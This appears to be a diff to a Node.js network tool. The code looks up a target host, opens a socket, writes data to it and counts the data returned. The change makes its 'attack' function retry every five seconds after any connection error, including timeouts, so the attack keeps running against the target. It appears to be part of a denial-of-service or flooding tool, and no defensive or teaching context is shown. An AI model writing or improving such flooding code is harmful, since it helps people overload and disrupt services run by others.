@@ -27,12 +27,12 @@ dns.lookup(_url.hostname, {family: 4}, function (err, address) {
       socket.write(data)
     });
     socket.on('error', function (err) {
-      if ('ECONNRESET' === err.code) {
-        setTimeout(attack, 5000);
+      if ('ECONNRESET' === err.code|| 'ETIMEDOUT' === err.code) {
       }
       else {
         console.error(err);
       }
+      setTimeout(attack, 5000);
     });
     socket.on('data', function (chuck) {
       loadDataAmount += chuck.length;
